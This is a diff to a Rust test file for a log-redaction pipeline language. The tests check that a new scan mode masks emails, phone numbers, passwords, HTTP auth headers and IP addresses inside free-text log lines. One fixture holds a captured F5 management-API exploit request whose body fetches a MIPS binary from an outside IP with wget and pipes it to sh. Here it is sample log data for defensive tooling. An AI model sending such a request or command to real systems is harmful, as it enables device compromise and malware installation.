@@ -319,6 +319,281 @@ m : chars = read(v) | mask(text, keep_first:18446744073709551615, keep_last:1844
 }
 
 // ---------------------------------------------------------------------------
+// scan mode (`scan:true` / `pii` / `http_auth`) on mixed text
+// ---------------------------------------------------------------------------
+
+const MIXED_LOG: &str = "2026-10-20 15:26:46 DEBUG MsgUserContext - login user=huangxingbo password=Dayu@1234 mobile=13800138000 email=zhangsan@example.com from 10.168.0.123";
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_scan_replaces_only_matching_fragments() {
+    let dst = run(
+        r#"
+name : t
+---
+mail   : chars = read(log) | mask_text(mail) ;
+mobile : chars = read(log) | mask_text(mobile) ;
+id     : chars = read(log) | mask_text(id_card) ;
+domain : chars = read(log) | mask_text(domain) ;
+"#,
+        record(&[("log", MIXED_LOG)]),
+    )
+    .await;
+
+    assert_eq!(
+        text(&dst, "mail"),
+        "2026-10-20 15:26:46 DEBUG MsgUserContext - login user=huangxingbo password=Dayu@1234 mobile=13800138000 email=z***@example.com from 10.168.0.123"
+    );
+    assert_eq!(
+        text(&dst, "mobile"),
+        "2026-10-20 15:26:46 DEBUG MsgUserContext - login user=huangxingbo password=Dayu@1234 mobile=*******8000 email=zhangsan@example.com from 10.168.0.123"
+    );
+    // The log has no ID card, so nothing is touched (no fail-closed wipe).
+    assert_eq!(text(&dst, "id"), MIXED_LOG);
+    assert_eq!(
+        text(&dst, "domain"),
+        "2026-10-20 15:26:46 DEBUG MsgUserContext - login user=huangxingbo password=Dayu@1234 mobile=13800138000 email=zhangsan@***.example.com from 10.168.0.123"
+    );
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_text_pii_masks_contacts_and_credentials() {
+    let dst = run(
+        r#"
+name : t
+---
+pii : chars = read(log) | mask_text(pii) ;
+"#,
+        record(&[("log", MIXED_LOG)]),
+    )
+    .await;
+    assert_eq!(
+        text(&dst, "pii"),
+        "2026-10-20 15:26:46 DEBUG MsgUserContext - login user=huangxingbo password=[REDACTED] mobile=*******8000 email=z***@example.com from 10.168.0.123"
+    );
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_pii_leaves_plain_log_lines_untouched() {
+    let line = "2026-10-20 15:26:46 DEBUG MsgUserContext - login user=huangxingbo";
+    let dst = run(
+        r#"
+name : t
+---
+pii : chars = read(log) | mask_text(pii) ;
+"#,
+        record(&[("log", line)]),
+    )
+    .await;
+    assert_eq!(text(&dst, "pii"), line);
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_http_auth_keeps_request_line_body_and_other_headers() {
+    let payload = "POST /mgmt/tm/util/bash HTTP/1.1\n\
+Host: /mgmt/tm/util/bash\n\
+User-Agent: Mozilla/5.0\n\
+X-F5-Auth-Token: a\n\
+Content-Type: application/json\n\
+Authorization: Basic YWRtaW46aG9yaXpvbjM=\n\
+Connection: close\n\
+Content-Length: 103\n\n\
+{\"command\":\"run\",\"utilCmdArgs\":\"-c 'wget http://31.56.39.60/memory_bin_dir/memory_load.mips -O- | sh'\"}";
+    let dst = run(
+        r#"
+name : t
+---
+net_payload : chars = read(net_payload) | mask_text(http_auth) ;
+"#,
+        record(&[("net_payload", payload)]),
+    )
+    .await;
+
+    let expected = payload
+        .replace("X-F5-Auth-Token: a", "X-F5-Auth-Token: [REDACTED]")
+        .replace(
+            "Authorization: Basic YWRtaW46aG9yaXpvbjM=",
+            "Authorization: Basic [REDACTED]",
+        );
+    assert_eq!(text(&dst, "net_payload"), expected);
+    assert!(text(&dst, "net_payload").contains("memory_load.mips"));
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_scan_ip_maps_addresses_and_keeps_other_text() {
+    let dst = run(
+        r#"
+name : t
+---
+log : chars = read(log) | mask_text(ip, allow_unsalted:true) ;
+"#,
+        record(&[("log", "client 203.0.113.5 said hi")]),
+    )
+    .await;
+    let out = text(&dst, "log");
+    assert!(
+        out.starts_with("client 240.") || {
+            out.split(' ')
+                .nth(1)
+                .and_then(|ip| ip.split('.').next()?.parse::<u8>().ok())
+                .is_some_and(|first| first >= 240)
+        }
+    );
+    assert!(out.ends_with(" said hi"));
+    assert!(!out.contains("203.0.113.5"));
+}
+
+// ---------------------------------------------------------------------------
+// scan mode (`mask_text`) integration: object / batch / generalized pipes
+// ---------------------------------------------------------------------------
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_text_works_inside_object_and_batch() {
+    let dst = run(
+        r#"
+name : t
+---
+summary : obj = object {
+  line : chars = read(log) | mask_text(pii) ;
+};
+"#,
+        record(&[("log", MIXED_LOG)]),
+    )
+    .await;
+    let line = obj_text(&dst, "summary", "line").expect("nested line");
+    assert!(line.contains("mobile=*******8000"));
+    assert!(line.contains("password=[REDACTED]"));
+
+    let dst = run(
+        r#"
+name : t
+---
+*_mail : chars = read() | mask_text(mail) ;
+"#,
+        record(&[
+            ("a_mail", "alice@example.com"),
+            ("b_mail", "bob@example.org"),
+            ("other", "keep"),
+        ]),
+    )
+    .await;
+    assert_eq!(text(&dst, "a_mail"), "a***@example.com");
+    assert_eq!(text(&dst, "b_mail"), "b***@example.org");
+    assert!(dst.field("other").is_none());
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_text_accepts_generalized_pipe_sources() {
+    let dst = run(
+        r#"
+name : t
+---
+fmt_text : chars = fmt("mail={a}", @a) | mask_text(mail) ;
+match_text : chars = match read(level) {
+  chars(high) => chars(contact 13800138000),
+  _ => chars(none) ;
+} | mask_text(mobile) ;
+keyword_form : chars = pipe read(log) | mask_text(mobile) ;
+"#,
+        record(&[
+            ("a", "alice@example.com"),
+            ("level", "high"),
+            ("log", MIXED_LOG),
+        ]),
+    )
+    .await;
+    assert_eq!(text(&dst, "fmt_text"), "mail=a***@example.com");
+    assert_eq!(text(&dst, "match_text"), "contact *******8000");
+    assert!(text(&dst, "keyword_form").contains("mobile=*******8000"));
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_text_ip_is_deterministic_and_pool_scoped() {
+    let _guard = DEFAULT_SECRET_LOCK.lock().await;
+    set_secret_str("pii_salt", "mask-text-ip-salt");
+    let oml = r#"
+name : t
+---
+log : chars = read(log) | mask_text(ip, pool:198.18.0.0/15) ;
+"#;
+    let src = record(&[("log", "client 203.0.113.5 ok")]);
+    let first = text(&run(oml, src.clone()).await, "log");
+    let second = text(&run(oml, src).await, "log");
+    assert_eq!(first, second, "same salt must map deterministically");
+    assert!(!first.contains("203.0.113.5"), "got {first}");
+    let octets: Vec<u8> = first
+        .split(' ')
+        .nth(1)
+        .expect("mapped ip")
+        .split('.')
+        .map(|part| part.parse::<u8>().expect("octet"))
+        .collect();
+    assert!(
+        octets.len() == 4 && octets[0] == 198 && matches!(octets[1], 18 | 19),
+        "custom pool must be honoured, got {first}"
+    );
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_text_ip_output_converts_to_ip_target() {
+    let dst = run(
+        r#"
+name : t
+---
+ip : ip = read(ip) | mask_text(ip, allow_unsalted:true) ;
+"#,
+        record(&[("ip", "203.0.113.5")]),
+    )
+    .await;
+    let out = text(&dst, "ip");
+    assert!(
+        out.parse::<std::net::IpAddr>().is_ok(),
+        "mapped value must convert back to an ip target, got {out}"
+    );
+    assert_ne!(out, "203.0.113.5");
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_text_pii_handles_single_line_and_prefixed_keys() {
+    let dst = run(
+        r#"
+name : t
+---
+text : chars = read(text) | mask_text(pii) ;
+"#,
+        record(&[(
+            "text",
+            "db_password=Hunter2 client_secret=xyz Authorization: Basic dXNlcjpwdw==",
+        )]),
+    )
+    .await;
+    assert_eq!(
+        text(&dst, "text"),
+        "db_password=[REDACTED] client_secret=[REDACTED] Authorization: Basic [REDACTED]"
+    );
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mask_keeps_whole_value_semantics_next_to_mask_text() {
+    // `mask` still fails closed on a value that does not match the kind.
+    let dst = run(
+        r#"
+name : t
+---
+as_mask : chars = read(log) | mask(mail) ;
+as_text : chars = read(log) | mask_text(mail) ;
+"#,
+        record(&[("log", MIXED_LOG)]),
+    )
+    .await;
+    // `mask` still treats the whole field as one value: it splits at the last
+    // `@` and collapses the entire log, which is exactly why `mask_text`
+    // exists.
+    assert_eq!(text(&dst, "as_mask"), "2***@example.com from 10.168.0.123");
+    assert!(text(&dst, "as_text").contains("email=z***@example.com"));
+    assert!(text(&dst, "as_text").contains("password=Dayu@1234"));
+}
+
+// ---------------------------------------------------------------------------
 // zero-config defaults (`SEC_PII_SALT` / `SEC_PII_KEY`)
 // ---------------------------------------------------------------------------
 
@@ -735,7 +1010,26 @@ async fn parser_rejects_invalid_privacy_syntax() {
         "x : chars = read(x) | mask(text, style:head) ;",
         "x : chars = read(x) | mask(text, unknown:1) ;",
         "x : chars = read(x) | mask(mobile, char:'ab') ;",
-        "x : chars = read(x) | mask(mobile, char:'') ;",
+        "x : chars = read(x) | mask(text, char:'') ;",
+        // `mask` only accepts field-value kinds
+        "x : chars = read(x) | mask(name, scan:true) ;",
+        "x : chars = read(x) | mask(mail, scan:true) ;",
+        "x : chars = read(x) | mask(pii) ;",
+        "x : chars = read(x) | mask(http_auth) ;",
+        // `mask_text` only accepts text-locatable kinds and its own parameters
+        "x : chars = read(x) | mask_text() ;",
+        "x : chars = read(x) | mask_text(unknown) ;",
+        "x : chars = read(x) | mask_text(name) ;",
+        "x : chars = read(x) | mask_text(address) ;",
+        "x : chars = read(x) | mask_text(text) ;",
+        "x : chars = read(x) | mask_text(keymsg) ;",
+        "x : chars = read(x) | mask_text(pii, scan:true) ;",
+        "x : chars = read(x) | mask_text(pii, on_error:fail) ;",
+        "x : chars = read(x) | mask_text(mobile, keep_levels:2) ;",
+        "x : chars = read(x) | mask_text(domain, keep_first:1) ;",
+        "x : chars = read(x) | mask_text(mail, pool:198.18.0.0/15) ;",
+        "x : chars = read(x) | mask_text(ip, on_error:fail) ;",
+        "x : chars = read(x) | mask_text(http_auth, char:*) ;",
         // hash / tokenize errors
         "x : chars = read(x) | hash(sha999) ;",
         "x : chars = read(x) | hash(sha256, encoding:nope) ;",
@@ -763,6 +1057,12 @@ async fn parser_accepts_valid_parameter_combinations() {
         "x : chars = read(x) | mask(domain, keep_levels:1) ;",
         "x : chars = read(x) | mask(name, style:tail) ;",
         "x : ip    = read(x) | mask(ip, pool:198.18.0.0/15, allow_unsalted:true, placeholder:'P') ;",
+        "x : chars = read(x) | mask_text(mail, keep_domain:false) ;",
+        "x : chars = read(x) | mask_text(mobile) ;",
+        "x : chars = read(x) | mask_text(ip, allow_unsalted:true) ;",
+        "x : chars = read(x) | mask_text(pii) ;",
+        "x : chars = read(x) | mask_text(pii, placeholder:'P') ;",
+        "x : chars = read(x) | mask_text(http_auth) ;",
         "x : chars = read(x) | hash() ;",
         "x : chars = read(x) | hash(md5, encoding:base64url, truncate:8) ;",
         "x : chars = read(x) | hash(algo:sha1) ;",
